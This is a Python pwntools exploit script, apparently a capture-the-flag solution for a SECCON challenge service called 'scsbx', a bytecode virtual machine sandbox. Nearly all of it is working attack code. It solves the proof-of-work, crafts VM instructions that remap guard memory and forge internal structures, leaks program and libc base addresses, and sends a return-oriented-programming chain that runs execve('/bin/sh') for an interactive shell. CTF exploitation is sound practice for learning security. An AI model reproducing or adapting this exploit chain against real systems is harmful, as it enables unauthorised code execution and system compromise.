from pwn import *
import string
import hashlib

context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './scsbx'
HOST = 'pwn-neko.chal.seccon.jp'
PORT = 19001

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def pow_solve(r):
    r.recvuntil('????')
    postfix = r.recvuntil('")', True)
    r.recvuntil(' = ')
    ans = r.recvuntil('\n', True)
    words = string.printable
    for i in words:
        print words.index(i), "/", len(words)
        for j in words:
            for k in words:
                for m in words:
                    # print i+j+k+m
                    h = hashlib.sha256()
                    h.update(i+j+k+m+postfix)
                    if ans == h.hexdigest():
                        r.sendline(i+j+k+m)
                        return
                    

def push(value):
    payload = ''
    payload += chr(0x20)
    payload += p32(value)
    return payload

def rol():
    return chr(0x56)
def ror():
    return chr(0x57)
def show():
    return 'p'

def dup(ofc):
    payload = ''
    payload += push(ofc)
    payload += chr(0x22)
    return payload

def sub():
    return "A"

def xchg(ofc):
    payload = ''
    payload += push(ofc)
    payload += chr(0x23)
    return payload

def read(addr, size):
    payload = ''
    payload += push(size)
    payload += push(addr)
    payload += chr(0x60)
    return payload

def write(addr, size):
    payload = ''
    payload += push(size)
    payload += push(addr)
    payload += chr(0x61)
    return payload

def mmap(addr, size):
    payload = ''
    payload += push(size)
    payload += push(addr)
    payload += chr(0x62)
    return payload

def munmap(addr):
    payload = ''
    payload += push(addr)
    payload += chr(0x63)
    return payload

def jeq():
    return "1"

def jmp(addr):
    payload = ''
    payload += push(addr)
    payload += "0"
    return payload

def l64(addr):
    payload = ''
    payload += push(addr)
    payload += chr(0x25)
    return payload

def push64(addr):
    payload = ''
    payload += push(addr&0xffffffff)
    payload += push(addr >> 32)
    return payload

def shr(addr = -1, n = 0):
    payload = ''
    if addr != -1:
        payload += push(n)
        payload += push(addr)
    payload += chr(0x55)
    return payload

def read(addr, size):
    payload = ''
    payload += push(size)
    payload += push(addr)
    payload += chr(0x60)
    return payload

# LAYOUT
# 0x100000000: vtable        0x100000008: vector start
# 0x100000010: vector end    0x100000018: vector cap
# 0x100000020: ip, stat      0x100000028: code base      
# 0x100000030: stack base    0x100000038: code size, cap
# 0x100000040: stack depth

guard = 0xffff0000
fake_vector = 0xfffffff0-0x10

payload = ''
payload += munmap(guard)
payload += mmap(guard, 0x8000)
payload += mmap(guard+0x8000, 0x8000)
payload += push(0x20000/4-24)

payload += dup(0)
payload += push(1)
payload += xchg(1)
payload += sub()
payload += dup(0)
payload += push(0)
payload += push(0x21)
payload += push(0x49)
payload += jeq()

payload += l64(0xffffffff)
payload += show()
payload += push64(0)
payload += push64(0x1000000000000000)
payload += push64(0x333)
payload += push64(0x444)
payload += push64(0x555)
payload += push64(0x666)
payload += push64(0x666)
payload += push64(0x777)
payload += push64(0x888)
payload += read(0xfffffff0, 7)
payload += dup(1)
payload += dup(1)
payload += dup(1)
payload += dup(1)
payload += push64(0xffffffb0)
payload += push64(0xffffffb8)
payload += push64(0xffffffb8)
payload += push64(0xeb)
payload += push64(0x55540000)
payload += push64(0xfffe0000)
payload += push64(0x0000400000001000)
payload += show()# pie leak
payload += read(0xfffffff0-0x10, 0x100)
payload += show()# libc leak
payload += read(0xffffffc0, 0x100)
payload += show()
payload += chr(0x25) #l64 to trigger address check

r = start()
if args.R:
    pow_solve(r)
if args.D:
    debug(r, [0x298b, 0x24e7])

r.sendlineafter('size: ', str(len(payload)))
r.sendafter('code: ', payload)

r.recvuntil('STACK TOP')
r.recvuntil('0 | ')
leak_lo = int(r.recvuntil('\n', True), 16) >> 8
r.recvuntil('1 | ')
leak_hi = int(r.recvuntil('\n', True), 16) << 24 
leak = leak_hi | leak_lo
dbg('leak')
pie = leak - 0x203c68
dbg('pie')
fake_stack = pie + 0x204000+0x260
rdi = pie + 0x00001c84
r.sendafter('---\n', p64(leak)[:-1])

payload = ''
payload += flat(0xfffff000, 0x100000, fake_stack, 0x100000)
payload += flat(leak, fake_vector, fake_vector+0x20, fake_vector+0x20, 0x11e, 0x55540000, fake_stack, 0x0000400000001000, 0x3)

r.sendafter('--------------\n', payload)
r.recvuntil('STACK TOP')
r.recvuntil('0 | ')
leak_hi = int(r.recvuntil('\n', True), 16) << 32  
r.recvuntil('1 | ')
leak_lo = int(r.recvuntil('\n', True), 16)
leak = leak_hi | leak_lo
dbg('leak')
base = leak - 0x3ec6a0
system = base + 0x55410
leave = base + 0x0005aa48

rsp = base + 0x00032b5a
if args.R:
    rdx_p1 = base + 0x0011c371
else:
    rdx_p1 = base + 0x0011c1e1
rsi = base + 0x0002959f
rax = base + 0x0004a54f
syscall = base + 0x0002584d
binsh = base + 0x1b75aa

payload = ''
payload += p64(leave)
payload += flat(0,1,u64("/bin/sh\x00"))
payload += flat(0xffffffe000000003, rsp, 0x100000048, 0xdeadbeef)
payload += p64(0xffffffc0) # @0x100000000
payload += flat(0, system, 0)
payload += flat(0x12a, 0x55540000, 0xffffffd8, 0x0000400000001000, 3)
payload += flat(rax, 0x3b, rdi, binsh, rsi, 0, rdx_p1, 0, 0, syscall)
r.sendafter('--------------\n', payload)

r.interactive()

